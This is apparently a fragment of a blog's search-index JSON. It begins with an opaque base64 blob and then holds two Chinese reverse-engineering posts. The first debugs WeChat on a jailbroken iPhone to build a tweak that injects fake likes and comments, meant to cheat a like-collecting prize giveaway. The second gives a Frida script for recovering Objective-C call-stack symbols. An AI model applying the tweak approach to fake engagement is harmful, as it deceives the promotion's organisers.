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","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Accessibility","slug":"Accessibility","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"}]},{"title":"微信集赞/评论插件分析及开发","date":"2019-07-22T02:22:01.000Z","path":"2019/07/22/fkwechatLike/fkwechatLike/","text":"微信集赞/评论插件分析及开发开始为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！ 理性分析再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。 准备条件 一台mac 一台越狱的iOS设备 ida/Hooper/theos flex/issh/xia0LLDB 其他常见逆向工具等 对于一贯喜欢上调试器分析得我，所以写了iSSH和xia0LLDB两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。 逆向分析逆向赞和评论的数据模型一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为WCTimeLineViewController而且界面是一个UITableView 将wechat执行文件拖入Hooper（wechat文件太大，ida分析会很卡）找到UITableView的代理方法：-[WCTimeLineViewController tableView:cellForRowAtIndexPath:] 这里面肯定会根据模型去设置cell数据 r2 = [r28 section]; var_70 = r25; r24 = [r25 calcDataItemIndex:r2]; r25 = [[MMServiceCenter defaultCenter] retain]; r2 = [WCFacade class]; var_78 = r28; r0 = [r25 getService:r2]; r0 = [r0 retain]; r24 = [[r0 getTimelineDataItemOfIndex:r24] retain]; [r0 release]; [r25 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r25 = [[r0 getLayerIdForDataItem:r24] retain]; [r0 release]; [r19 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r20 = r0; r0 = [r0 getShowTip:r24 layerId:r25]; r29 = r29; r26 = [r0 retain]; [r20 release]; [r19 release]; 整理下来就是 [[MMServiceCenter defaultCenter] getService:[WCFacade class]]会得到一个WCFacade对象，然后通过 [WCFacade getTimelineDataItemOfIndex:]就能得到cell的数据 看到这里，上调试器！看下都是什么数据… 将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信 直接输入issh debug -a wechat就能挂上微信 xia0 ~ $ issh debug -a wechat [I]:iproxy process for 2222 port alive, pid=1382 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=1395 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat 打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本） xia0 ~ $ lldb &quot;xutil&quot; command installed -&gt; xutil &quot;choose&quot; command installed -&gt; choose &quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:] &quot;sbt&quot; command installed -&gt; sbt // 连接到远端 (lldb) pcc 这里有两种方法： 一种是用xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;下断点去查看； // 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点 (lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot; (lldb) c 第二种是由于lldb支持choose命令，可以直接拿到WCFacade对象。既然如此选choose (lldb) choose WCFacade &lt;__NSArrayM 0x2823d9860&gt;( &lt;WCFacade: 0x139e1c030&gt; ) 调用其getTimelineDataItemOfIndex:方法就能拿到第一条朋友圈的数据 (lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0] Class name: WCDataItem, addr: 0x13e2871d0 tid: 13121667995275047007 username: wxid_6913ohfkk7kq12 createtime: 1564224719 commentUsers: ( ) contentObj: &lt;WCContentItem: 0x2801f5500&gt; 输入ivars 0x13e2871d0就能拿到对象的所有属性值 (lldb) ivars 0x13e2871d0 &lt;WCDataItem: 0x13e2871d0&gt;: in WCDataItem: cid (int): 0 tid (NSString*): @&quot;13121667995275047007&quot; type (int): 0 flag (int): 0 username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot; nickname (NSString*): @&quot;xia0&quot; createtime (int): 1564224719 locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt; likeFlag (BOOL): NO likeCount (int): 0 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt; commentCount (int): 0 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt; contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt; appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt; contentDesc (NSString*): @&quot;test&quot; 由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。 里面我们还发现了likeUsers和commentUsers的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。 likeCount (int): 1 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt; 发现赞的数量变为1了，在看下里面的内容 (lldb) po 0x283e37060 &lt;__NSArrayM 0x283e37060&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: source: 0 type: 1 createTime: 1564225007 isLocalAdded: 0 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: bDeleted: 0 ) 正是我自己的微信号。同理可以得到评论 commentCount (int): 1 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt; (lldb) po 0x283e349c0 &lt;__NSArrayM 0x283e349c0&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: 评论测试 source: 0 type: 2 createTime: 1564225144 isLocalAdded: 1 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: (null) bDeleted: 0 ) 到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。 最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。 寻找HOOK点先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个WCDataItem对象，那么我们可以对WCDataItem里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？ 但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样 (lldb) bt * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1 * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888 frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004 frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340 frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992 frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240 frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776 frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248 frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932 但是用我写的sbt命令就能恢复oc符号，下面我们对-[WCDataItem setCid:]下断点，然后得到调用栈 (lldb) sbt ==========================================xia0LLDB========================================== BlockSymbolFile Not Set The Block Symbol Json File, Try &#39;sbt -f&#39; ============================================================================================ frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0 frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004 frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340 frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64 frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116 frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48 frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552 frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348 frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233 frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732 frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112 frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336 frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728 frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68 frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84 frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88 frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32 frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884 frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252 frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832 frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452 frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104 frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216 frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268 frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4 可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程 其中里面有个很明显的方法 -[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] 看名字就知道，这个应该就是我们需要的hook点。 整理思路整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。 大概的代码逻辑应该如下 在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈 取出自己朋友圈的赞和评论数据备用 随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面 下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。 这里分析的过程和上面类似，我选择的hook点为：-[WCCommentDetailViewControllerFB setDataItem:] 代码实现具体的代码实现这里就不再去分析了，我把代码开源到了这里fkwechatzan 完成效果 集赞助手设置界面 朋友圈详情界面 赞和评论 一点总结本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。 最后，妈妈再也不用担心没有人赞我的朋友圈了~ 下次集赞领礼品的活动我要定了！","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Frida调用栈符号恢复","date":"2019-07-02T09:00:14.000Z","path":"2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/","text":"Frida调用栈符号恢复开始搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决lldb调试器栈符号恢复)方案，决定把lldb的栈符号恢复脚本移植到frida中。 如何恢复已经去掉符号表的可执行文件？这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。 OC函数符号恢复思路首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。 根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？ 这里有两种办法： 第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。 第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有objc_copyClassNamesForImage、class_copyMethodList 、objc_getClass、method_getImplementation、method_getName、objc_getClass、objc_getMetaClass 现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。 frida的js环境编写代码由于我之前在lldb的python脚本中写过该过程代码(lldb内置的OC解释器语法要求十分严格，调试了很久的代码) 按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。 主要的代码如下： 根据模块路径获取其所有的类 function getAllClass(modulePath){ // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount) var objc_copyClassNamesForImage = new NativeFunction( Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); // free var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // if given modulePath nil, default is mainBundle if(!modulePath){ var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String(); }else{ var path = modulePath; } // create args var pPath = Memory.allocUtf8String(path); var p = Memory.alloc(Process.pointerSize); Memory.writeUInt(p, 0); var pClasses = objc_copyClassNamesForImage(pPath, p); var count = Memory.readUInt(p); var classes = new Array(count); for (var i = 0; i &lt; count; i++) { var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize)); classes[i] = Memory.readUtf8String(pClassName); } free(pClasses); // XLOG(classes) return classes; } 根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。 function getAllMethods(classname){ var objc_getClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var class_copyMethodList = new NativeFunction( Module.findExportByName(null, &#39;class_copyMethodList&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); var objc_getMetaClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getMetaClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var method_getName = new NativeFunction( Module.findExportByName(null, &#39;method_getName&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // get objclass and metaclass var name = Memory.allocUtf8String(classname); var objClass = objc_getClass(name) var metaClass = objc_getMetaClass(name) // get obj class all methods var size_ptr = Memory.alloc(Process.pointerSize); Memory.writeUInt(size_ptr, 0); var pObjMethods = class_copyMethodList(objClass, size_ptr); var count = Memory.readUInt(size_ptr); var allMethods = new Array(); var allObjMethods = new Array(); // get obj class all methods name and IMP for (var i = 0; i &lt; count; i++) { var curObjMethod = new Array(); var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize)) var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL)) var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize)) // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP) curObjMethod.push(pObjMethodName) curObjMethod.push(objMethodIMP) allObjMethods.push(curObjMethod) } var allMetaMethods = new Array(); // get meta class all methods name and IMP var pMetaMethods = class_copyMethodList(metaClass, size_ptr); var count = Memory.readUInt(size_ptr); for (var i = 0; i &lt; count; i++) { var curMetaMethod = new Array(); var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize)) var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL)) var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize)) //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP) curMetaMethod.push(pMetaMethodName) curMetaMethod.push(metaMethodIMP) allMetaMethods.push(curMetaMethod) } allMethods.push(allObjMethods) allMethods.push(allMetaMethods) free(pObjMethods); free(pMetaMethods); return allMethods; } 通过调用栈地址根据最近匹配的算法去找到对应的符号信息 function findSymbolFromAddress(modulePath,addr){ var frameAddr = addr var theDis = 0xffffffffffffffff; var tmpDis = 0; var theClass = &quot;None&quot; var theMethodName = &quot;None&quot; var theMethodType = &quot;-&quot; var theMethodIMP = 0 var allClassInfo = {} var allClass = getAllClass(modulePath); for(var i = 0, len = allClass.length; i &lt; len; i++){ var mInfo = getAllMethods(allClass[i]); var curClassName = allClass[i] objms = mInfo[0]; for(var j = 0, olen = objms.length; j &lt; olen; j++){ mname = objms[j][0] mIMP = objms[j][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;-&quot; } } } metams = mInfo[1]; for(var k = 0, mlen = metams.length; k &lt; mlen; k++){ mname = metams[k][0] mIMP = metams[k][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;+&quot; } } } } symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot; if(symbol.indexOf(&quot;.cxx&quot;)!=-1){ symbol = &quot;maybe C function?&quot; } // if distance &gt; 3000, maybe a c function if(theDis &gt; 3000){ symbol = &quot;maybe C function? symbol:&quot; + symbol } return symbol; } 在匹配算法的最后还进行了一些判断，当解析出来的方法名包含.cxx方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。 最后完整的项目地址：https://github.com/4ch12dy/xia0FridaScript 测试我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本 #!/usr/bin/python import frida import sys import codecs import os PACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot; def on_message(message, data): try: if message: print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;])) except Exception as e: print(message) print(e) def xia0CallStackSymbolsTest(): script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() js = &#39;&#39;&#39; if (ObjC.available) { try { //Your class name here - ZYOperationView operationCopyLink var className = &quot;ZYMediaDownloadHelper&quot;; //Your function name here var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;; var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;); Interceptor.attach(hook.implementation, { onEnter: function(args) { // args[0] is self // args[1] is selector (SEL &quot;sendMessageWithText:&quot;) // args[2] holds the first function argument, an NSString console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName); // just call [NSThread callStackSymbols] var threadClass = ObjC.classes.NSThread var symbols = threadClass[&quot;+ callStackSymbols&quot;]() console.log(symbols) // call xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address] xia0CallStackSymbols(true); xia0CallStackSymbols(false); } }); } catch(err) { console.log(&quot;[!] Exception2: &quot; + err.message); } } else { console.log(&quot;Objective-C Runtime is not available!&quot;); } &#39;&#39;&#39; return source+js def do_hook(): return xia0CallStackSymbolsTest() if __name__ == &#39;__main__&#39;: try: device = frida.get_device_manager().enumerate_devices()[-1] print device pid = device.spawn([PACKAGE_NAME]) print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid)) session = device.attach(pid) device.resume(pid) script = session.create_script(do_hook()) script.on(&#39;message&#39;, on_message) script.load() sys.stdin.read() except KeyboardInterrupt: sys.exit(0) 只需要将xia0CallStackSymbols.js脚本放到项目中，然后用以下代码即可导入使用 script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() your_frida_js_hook_script = &quot;&quot; load_js = your_frida_js_hook_script+source 恢复的效果如下： 通过[NSThread callStackSymbols]获取的调用栈符号 通过调用xia0CallStackSymbols函数获取的调用栈符号 作为比较，我在放上lldb中恢复调用栈 这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在这里，现在还能支持block函数的符号恢复。 这里有几个问题需要说明一下： xia0CallStackSymbols的符号为什么前15个地址没有显示？ 因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。 xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号 如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况) 